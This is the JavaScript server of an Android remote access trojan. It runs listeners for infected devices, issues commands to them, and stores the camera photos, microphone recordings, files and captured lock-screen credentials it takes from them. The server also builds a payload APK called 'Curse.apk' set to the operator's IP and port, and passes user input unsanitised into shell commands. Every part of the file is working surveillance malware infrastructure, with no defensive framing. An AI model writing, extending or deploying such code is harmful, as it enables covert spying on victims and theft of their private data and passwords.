const express = require('express');
const http = require('http');
const net = require('net');
const socketIo = require('socket.io');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Global Logger
function sysLog(msg, type = 'info') {
    const time = new Date().toLocaleTimeString();
    const entry = { time, msg, type };
    io.emit('sys_log', entry);
    console.log(`[${time}] ${msg}`);
}

app.use(express.static(path.join(__dirname, 'public')));
app.use('/output', express.static(path.join(__dirname, 'output')));
app.use('/Downloads', express.static(path.join(__dirname, 'Downloads')));
app.use(express.json());

let clients = {};
let listeners = {}; // port -> server
let activeRecordings = {}; 

// Stats tracking
let stats = {
    sent: { bytes: 0, packets: 0, lastBytes: 0, rate: 0 },
    recv: { bytes: 0, packets: 0, lastBytes: 0, rate: 0 }
};

['output', 'Downloads'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
});

function startTcpServer(port) {
    if (listeners[port]) return;

    const tcpServer = net.createServer((socket) => {
        let clientId = null;
        let buffer = '';

        socket.on('data', (data) => {
            // Stats
            stats.recv.bytes += data.length;
            stats.recv.packets += 1;

            buffer += data.toString();
            let boundary = buffer.indexOf('\n');
            
            while (boundary !== -1) {
                const msg = buffer.substring(0, boundary).trim();
                buffer = buffer.substring(boundary + 1);
                
                if (msg) {
                    try {
                        const json = JSON.parse(msg);
                        
                        if (json.type === 'login') {
                            clientId = `${json.model}_${socket.remoteAddress.replace(/:/g, '_')}`;
                            
                            // Check for saved country
                            let country = 'Unknown';
                            const countryPath = path.join(__dirname, 'Downloads', clientId, 'country.txt');
                            if (fs.existsSync(countryPath)) {
                                country = fs.readFileSync(countryPath, 'utf8').trim();
                            }
                            json.country = country;

                            clients[clientId] = { socket, details: json };
                            io.emit('client_connected', { id: clientId, details: json });
                            sysLog(`CLIENT_CONNECTED: ${clientId}`, 'ok');
                            
                            const deviceDir = path.join(__dirname, 'Downloads', clientId);
                            ['camera', 'mic', 'files'].forEach(sub => {
                                const subDir = path.join(deviceDir, sub);
                                if (!fs.existsSync(subDir)) fs.mkdirSync(subDir, { recursive: true });
                            });
                        } else {
                            if (clientId) {
                                if (json.type === 'camera') {
                                    saveMedia(clientId, 'camera', json.image, 'jpg');
                                } else if (json.type === 'location') {
                                    if (json.country) {
                                        const countryPath = path.join(__dirname, 'Downloads', clientId, 'country.txt');
                                        fs.writeFileSync(countryPath, json.country);
                                        if (clients[clientId]) clients[clientId].details.country = json.country;
                                    }
                                } else if (json.type === 'mic') {
                                    saveMedia(clientId, 'mic', json.audio, 'aac');
                                } else if (json.type === 'mic_chunk') {
                                    if (activeRecordings[clientId]) {
                                        const audioBuffer = Buffer.from(json.data, 'base64');
                                        activeRecordings[clientId].stream.write(audioBuffer);
                                    }
                                } else if (json.type === 'file_download') {
                                    saveFile(clientId, json.name, json.data);
                                } else if (json.type === 'lock_captured') {
                                    saveLockData(clientId, json);
                                }
                            }
                            io.emit('client_data', { id: clientId, data: json });
                        }
                    } catch (e) { }
                }
                boundary = buffer.indexOf('\n');
            }
        });

        socket.on('close', () => {
            if (clientId) {
                if (activeRecordings[clientId]) {
                    const rec = activeRecordings[clientId];
                    rec.stream.end();
                    const mp3Path = rec.filepath.replace('.pcm', '.mp3');
                    const ffmpegCmd = `ffmpeg -f s16le -ar ${rec.sampleRate} -ac 1 -i "${rec.filepath}" "${mp3Path}"`;
                    exec(ffmpegCmd, (err) => { if (!err) fs.unlinkSync(rec.filepath); });
                    delete activeRecordings[clientId];
                }
                delete clients[clientId];
                io.emit('client_disconnected', clientId);
                sysLog(`CLIENT_DISCONNECTED: ${clientId}`, 'err');
            }
        });

        socket.on('error', (err) => { });
    });

    tcpServer.listen(port, '0.0.0.0', () => {
        listeners[port] = tcpServer;
        io.emit('listeners_update', Object.keys(listeners));
        sysLog(`LISTENER_STARTED: PORT ${port}`, 'ok');
    });

    tcpServer.on('error', (err) => {
        io.emit('listener_error', { port, message: err.message });
        sysLog(`LISTENER_ERROR: PORT ${port} - ${err.message}`, 'err');
        delete listeners[port];
        io.emit('listeners_update', Object.keys(listeners));
    });
}

function stopTcpServer(port) {
    if (listeners[port]) {
        listeners[port].close();
        delete listeners[port];
        io.emit('listeners_update', Object.keys(listeners));
        sysLog(`LISTENER_STOPPED: PORT ${port}`, 'warn');
    }
}

function saveMedia(clientId, type, base64Data, ext) {
    try {
        const buffer = Buffer.from(base64Data, 'base64');
        const filename = `${Date.now()}.${ext}`;
        const filepath = path.join(__dirname, 'Downloads', clientId, type, filename);
        fs.writeFileSync(filepath, buffer);
    } catch (e) { }
}

function saveFile(clientId, fileName, base64Data) {
    try {
        const buffer = Buffer.from(base64Data, 'base64');
        const filepath = path.join(__dirname, 'Downloads', clientId, 'files', fileName);
        fs.writeFileSync(filepath, buffer);
    } catch (e) { }
}

function saveLockData(clientId, data) {
    try {
        const filepath = path.join(__dirname, 'Downloads', clientId, 'lock_credentials.json');
        let existing = [];
        if (fs.existsSync(filepath)) {
            existing = JSON.parse(fs.readFileSync(filepath));
        }
        data.server_time = new Date().toLocaleString();
        existing.push(data);
        fs.writeFileSync(filepath, JSON.stringify(existing, null, 2));
    } catch (e) { }
}

// Stats and System Info Loop
setInterval(() => {
    // Calculate Rates
    stats.sent.rate = stats.sent.bytes - stats.sent.lastBytes;
    stats.recv.rate = stats.recv.bytes - stats.recv.lastBytes;
    stats.sent.lastBytes = stats.sent.bytes;
    stats.recv.lastBytes = stats.recv.bytes;

    const sysInfo = {
        cpu: (os.loadavg()[0] * 10).toFixed(1) + '%',
        ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + '%',
        uptime: Math.floor(os.uptime() / 3600) + 'h ' + Math.floor((os.uptime() % 3600) / 60) + 'm',
        platform: os.platform() + ' ' + os.release()
    };

    io.emit('stats_update', { stats, sysInfo });
}, 2000);

io.on('connection', (socket) => {
    const activeClients = Object.keys(clients).map(id => ({ id, details: clients[id].details }));
    socket.emit('initial_clients', activeClients);
    socket.emit('listeners_update', Object.keys(listeners));

    socket.on('start_listener', (port) => startTcpServer(parseInt(port)));
    socket.on('stop_listener', (port) => stopTcpServer(parseInt(port)));

    socket.on('order', (data) => {
        const { id, order, params } = data;
        if (clients[id]) {
            try {
                if (order === 'mic') {
                    if (params.action === 'start' && params.mode === 'record') {
                        const sampleRate = params.sample_rate || 11025;
                        const timestamp = Date.now();
                        const filename = `recording_${timestamp}.pcm`;
                        const filepath = path.join(__dirname, 'Downloads', id, 'mic', filename);
                        activeRecordings[id] = {
                            filepath, sampleRate, timestamp,
                            stream: fs.createWriteStream(filepath)
                        };
                    } else if (params.action === 'stop') {
                        if (activeRecordings[id]) {
                            const rec = activeRecordings[id];
                            rec.stream.end();
                            const mp3Path = rec.filepath.replace('.pcm', '.mp3');
                            const ffmpegCmd = `ffmpeg -f s16le -ar ${rec.sampleRate} -ac 1 -i "${rec.filepath}" "${mp3Path}"`;
                            exec(ffmpegCmd, (err) => {
                                if (!err) {
                                    fs.unlinkSync(rec.filepath);
                                    io.emit('client_data', { 
                                        id: id, 
                                        data: { type: 'mic_saved', file: `/Downloads/${id}/mic/recording_${rec.timestamp}.mp3` } 
                                    });
                                }
                            });
                            delete activeRecordings[id];
                        }
                    }
                }
                const msg = JSON.stringify({ order, ...params }) + '\n';
                clients[id].socket.write(msg);
                
                // Track Sent Stats
                stats.sent.bytes += msg.length;
                stats.sent.packets += 1;

            } catch (e) { }
        }
    });

    socket.on('build_apk', (config) => {
        sysLog(`BUILD_STARTED: ${config.ip}:${config.port}`);
        exec(`node builder.js ${config.ip} ${config.port}`, (err, stdout, stderr) => {
            io.emit('build_log', stdout + stderr);
            if (!err) {
                io.emit('build_success', 'Curse.apk');
                sysLog(`BUILD_SUCCESS: Curse.apk`, 'ok');
            } else {
                sysLog(`BUILD_FAILED`, 'err');
            }
        });
    });

    socket.on('build_apk_advanced', (config) => {
        sysLog(`ADVANCED_BUILD_STARTED: ${config.appName}`);
        const configPath = path.join(__dirname, 'build_config.json');
        fs.writeFileSync(configPath, JSON.stringify(config));
        exec(`node builder.js --config build_config.json`, (err, stdout, stderr) => {
            io.emit('build_log', stdout + stderr);
            if (!err) {
                io.emit('build_success', 'Curse.apk');
                sysLog(`ADVANCED_BUILD_SUCCESS: ${config.appName}`, 'ok');
            } else {
                sysLog(`ADVANCED_BUILD_FAILED`, 'err');
            }
        });
    });
});

server.listen(3000, () => {
    console.log('Web Dashboard running on http://localhost:3000');
});
